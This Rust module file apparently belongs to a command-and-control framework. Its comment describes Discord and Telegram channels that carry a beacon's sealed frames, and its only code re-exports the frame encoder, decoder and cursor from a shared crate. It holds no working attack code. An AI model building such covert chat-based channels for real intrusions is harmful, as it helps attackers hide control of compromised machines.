//! Chat-platform C2 channels (Discord, Telegram).
//!
//! The wire format — base64 sealed frames plus the poll cursor — lives in
//! `nw-profile::chat` so the beacon and the server-side channel adapter share
//! one implementation. A duplicate copy here would be free to drift from the
//! operator side and silently break the channel, so this module only
//! re-exports it.
//!
//! See `nw-profile::chat` for the endpoint forms and the channel protocol.

pub use nw_profile::chat::{Cursor, decode_frame, encode_frame};
